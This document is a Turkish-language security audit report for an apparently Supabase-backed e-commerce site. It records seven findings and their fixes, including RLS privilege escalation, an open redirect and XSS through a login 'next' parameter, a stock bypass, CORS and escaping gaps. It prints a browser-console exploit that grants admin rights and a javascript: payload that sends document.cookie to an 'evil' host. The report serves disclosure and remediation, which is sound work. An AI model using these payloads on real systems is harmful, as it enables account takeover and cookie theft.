# Esse Jeffe — Güvenlik Denetim Raporu

**Tarih:** 2026-07-09
**Kapsam:** Edge fonksiyonları, şifre sıfırlama/giriş akışı, admin panelleri, RLS politikaları (schema.sql), chat fonksiyonu, frontend XSS yüzeyleri.
**Not:** En kritik bulgu canlı Supabase veritabanında SQL ile doğrulandı.

---

> **DURUM (2026-07-09):** TÜM MADDELER (#1–#7) düzeltildi. #1 canlı DB'ye migration olarak uygulandı + `schema.sql`'e işlendi; #2 `ej-supabase.js`'e; #3 üç edge fonksiyonuna (create-order v5, paytr-token v6, chat v11) hem kodda hem canlıda deploy edildi. Aynı gün ikinci turda: #4 paylaşılan `_shared/cors.ts` origin-kilidi 5 fonksiyona; #5 admin-siparisler'e 50'lik sayfalama; #6 chat COD siparişine onay e-postası (`chat/order-email.ts` kopyası); #7 tüm `esc()`/`ejEsc` tanımlarına `'` → `&#39;` eklendi.

## 🔴 KRİTİK — Hemen kapatılmalı (canlıda doğrulandı)

### 1. Yetki yükseltme — herhangi bir üye kendini admin yapabilir  ✅ DÜZELTİLDİ

**Dosya:** `backend/schema.sql:470` (ilgili: `:57-61`, `:307-319`)
**Durum:** Canlı DB'de `pg_policy` + `information_schema.column_privileges` sorgularıyla **teyit edildi** (`with_check_expr` = null; `is_admin` kolonunda `authenticated` UPDATE grant'i mevcut).

`profiles` tablosunun UPDATE politikası:

```sql
create policy "kendi profilini güncelle" on profiles for update using (auth.uid() = id);
```

Bu politikada **`WITH CHECK` yok** ve `is_admin` kolonu için **kolon bazlı `REVOKE` de yok**. Postgres RLS'te `WITH CHECK` verilmediğinde `USING` ifadesi yeni satıra da uygulanır — `is_admin`'i `true` yapmak `id`'yi değiştirmediği için `auth.uid() = id` hâlâ sağlanır ve update kabul edilir.

**İstismar senaryosu:** Kayıtlı herhangi bir kullanıcı, tarayıcı konsolunda:

```js
ejSupabase.from('profiles').update({ is_admin: true })
  .eq('id', (await ejSupabase.auth.getUser()).data.user.id)
```

çalıştırınca `is_admin=true` olur. Bundan sonra `is_admin()` `true` döndüğü için tüm admin RLS politikaları açılır: **tüm siparişleri müşteri PII'siyle (ad/adres/telefon/e-posta) okuma, sipariş durumu değiştirme, ürün ekleme/silme/fiyat değiştirme, tüm chat konuşmalarını ve ziyaretçi verilerini okuma.** Admin sayfalarındaki client-side kontrol yalnızca UI kapısıdır; gerçek koruma RLS + `is_admin()` olduğu için bu delik tüm zinciri çökertir.

**Düzeltme (en pratik, tek satır):**

```sql
revoke update (is_admin) on profiles from authenticated, anon;
```

> **UYGULANAN GERÇEK DÜZELTME:** Yukarıdaki kolon-bazlı REVOKE tek başına
> yetmedi — `profiles` üzerinde **tablo seviyesinde** UPDATE grant'i olduğu için
> kolon REVOKE'u geçersiz kaldı (canlıda `column_privileges` hâlâ UPDATE
> gösterdi). Doğru çözüm tablo grant'ini kaldırıp yalnızca meşru kolonlara
> vermek:
> ```sql
> revoke update on profiles from authenticated, anon;
> grant update (full_name, phone) on profiles to authenticated;
> ```
> Ayrıca politikaya `with check (auth.uid() = id)` eklendi. Canlıda doğrulandı:
> `authenticated` artık yalnız `full_name`/`phone` UPDATE edebiliyor.

İstersek ek olarak politikaya `with check` de eklenebilir:

```sql
create policy "kendi profilini güncelle" on profiles for update
  using (auth.uid() = id)
  with check (auth.uid() = id
    and is_admin = (select is_admin from profiles where id = auth.uid()));
```

Düzeltme hem canlıya migration olarak hem de `schema.sql:470`'e uygulanmalı.

---

## 🟠 YÜKSEK

### 2. Giriş akışında `next` parametresiyle açık yönlendirme + olası XSS  ✅ DÜZELTİLDİ

**Dosya:** `backend/ej-supabase.js:496` (`handleLogin`)

```js
var to = new URLSearchParams(location.search).get('next') || 'hesap.html';
location.href = to;
```

`next` parametresi hiçbir doğrulamadan geçmeden `location.href`'e atanıyor.

**İstismar (open redirect):** `giris.html?next=https://sahte-esse.com` linki paylaşılır; kurban kimlik bilgisini girdikten sonra saldırgan sitesine yönlenir (phishing zinciri, güvenilir alan adından çıkış).

**İstismar (XSS):** `giris.html?next=javascript:fetch('//evil/'+document.cookie)` — başarılı girişten sonra `location.href = 'javascript:...'` aynı origin'de script çalıştırabilir.

**Öneri:** Yalnız yerel yollara izin ver:

```js
if (!/^[a-z0-9._-]+\.html([?#].*)?$/i.test(to)) to = 'hesap.html';
```

veya `next`'i bilinen bir beyaz listeyle eşleştir.

---

## 🟡 ORTA

### 3. Beden (size) zorunluluğu backend'de doğrulanmıyor — stok rezervasyon bypass'ı  ✅ DÜZELTİLDİ

**Dosyalar:** `backend/edge-functions/_shared/util.ts:57-68` (`canonVariant`); çağrılar `create-order/index.ts:114`, `paytr-token/index.ts:159`, `backend/functions/chat/index.ts:359` (`canonChatVariant`)

urun.html'deki "beden seç" modalı yalnızca client-side (`urun.html:488-617`). `canonVariant`/`canonChatVariant` boş girişi (`""`) "varyant seçilmemiş — geçerli" sayıyor (`util.ts:59`: `if (!val) return "";`). Yalnız `null` (listede-yok) durumu reddediliyor.

**İstismar:** Doğrudan API'ye `items:[{id:'pera', qty:1}]` (size'sız) gönderilirse sipariş kabul edilir. `reserveItems`'ta `size: r.size || ""` olduğundan, ürünün beden bazlı stok takibi varsa `size=""` satırı bulunamaz → `reserve_stock_bulk` bunu "takip edilmeyen → sınırsız" sayar. Sonuç: **beden bazlı stok limiti aşılıp aşırı satış (oversell)** ve bedensiz/kirli sipariş kaydı.

**Öneri:** Ürünün `sizes` listesi doluysa boş bedeni reddet (create-order/paytr-token/chat):

```
if (size === "" && (p.sizes||[]).length) return error
```

---

## 🔵 DÜŞÜK / Bilinen ve hâlâ geçerli maddeler

### 4. Chat dışı edge fonksiyonlarında `Access-Control-Allow-Origin: "*"`  ✅ DÜZELTİLDİ
> Paylaşılan `backend/edge-functions/_shared/cors.ts` eklendi (chat'teki modelin aynısı; `EDGE_ALLOWED_ORIGINS` → `CHAT_ALLOWED_ORIGINS` → prod alan adları; localhost otomatik izinli). create-order, submit-form, track-order, log-error ve paytr-token artık istek origin'ine göre başlık üretiyor.

**Dosyalar:** `create-order/index.ts:22`, `submit-form/index.ts:22`, `track-order/index.ts:29`, `log-error/index.ts:27`, `paytr-token/index.ts:37`
Etkisi sınırlı (bu uçlar çerez/oturumla değil opsiyonel Bearer + IP hız sınırı ile korunuyor; klasik CSRF uygulanmaz). Yine de `chat/index.ts:48-67`'deki origin-kilidi modelini bu uçlara taşımak tutarlılık sağlar.

### 5. admin-siparisler.html sayfalama yok  ✅ DÜZELTİLDİ
> 50'lik sayfalar halinde `range()` + `{ count: 'exact' }` ile çekiliyor; liste altında "Daha fazla yükle" düğmesi ve toplam sayaç var. Arama/filtre yüklü kayıtlarda çalışır (düğme yanında not gösterilir).

**Dosya:** `admin-siparisler.html:238-240` — `range()`/`limit()` yok; tüm siparişler + kalemleri tek seferde çekiliyor. Büyüdükçe bellek/yük ve gereksiz PII transferi.

### 6. Chat COD siparişinde onay e-postası gönderilmiyor  ✅ DÜZELTİLDİ
> `_shared/order-email.ts`'in birebir kopyası `backend/functions/chat/order-email.ts` olarak eklendi (chat farklı deploy ağacında; başlıkta senkron notu var). COD siparişi başarıyla yazıldıktan sonra müşteri + işletme e-postası gönderiliyor; hata sipariş akışını bozmaz.

**Dosya:** `backend/functions/chat/index.ts:496-497` — `create-order`/`paytr-callback` `_shared/order-email.ts` kullanıyor; chat farklı deploy ağacında olduğundan çağıramıyor. Sohbette COD sipariş veren müşteri onay e-postası almıyor.

### 7. `esc()` tek tırnağı (`'`) kaçırmıyor  ✅ DÜZELTİLDİ
> Repodaki TÜM `esc()`/`ejEsc` tanımlarına (`ej.js`, `ej-chat.js`, `ej-supabase.js`, admin.html, admin-urunler.html, admin-siparisler.html, hesap.html, sepet.html, siparis-takip.html, urun.html, order-email.ts ×2) `'` → `&#39;` eklendi.

**Dosyalar:** `admin-urunler.html:216,320,358` (`background-image:url('...')`), `backend/ej-supabase.js:62`
Tüm `esc()` yalnız `& < > "` kaçırıyor. Görsel URL'leri tek tırnaklı `url('...')` içine yazıldığından teorik CSS-bağlam çıkışı; ancak bu veriler yalnız admin (RLS write=admin) yazabildiği için pratik risk düşük. `esc()`'e `'` → `&#39;` eklenmesi önerilir.

---

## ✅ Temiz / doğrulanan iyi noktalar

- **Hardcoded secret yok:** Repoda yalnız `backend/supabase-config.js:9` publishable (anon) key var — RLS koruduğu için normal. `service_role`, PayTR, Gemini anahtarları yalnız `Deno.env.get(...)` ile okunuyor.
- **Şifre sıfırlama akışı temiz:** `resetPasswordForEmail` `redirectTo` sabit `/sifre-yenile.html`; token URL hash'inde işleniyor, **loglanmıyor**; `handleReset` önce oturum kontrol edip `updateUser` ile yazıyor; hatalı/expired link paramları `textContent` ile gösteriliyor (XSS yok).
- **XSS yüzeyleri korumalı:** Chat mesajları `textContent` (`ej-chat.js:793`), sipariş kartları `esc()`, sepet/son gezilenler/arama `ejEsc`. URL paramları güvenli yazılıyor.
- **Admin panel stored XSS yok:** admin.html ve admin-siparisler.html müşteri kaynaklı alanları (`full_name/phone/email/note/address`) `esc()`'ten geçiriyor.
- **Fiyat/varyant bütünlüğü:** Sipariş uçlarında fiyat DB'den yeniden hesaplanıyor, PayTR HMAC doğru, callback idempotent, stok rollback yerinde. chat `user_id` JWT'den çözülüyor.

---

## Öncelik sırası

1. **#1 Kritik** — profiles yetki yükseltme (bugün; tek satır `REVOKE`).
2. **#2 Yüksek** — login `next` doğrulaması.
3. **#3 Orta** — backend beden/stok doğrulaması.
4. Kalan bilinen maddeler (CORS, sayfalama, chat e-postası, `esc()` tek tırnak).
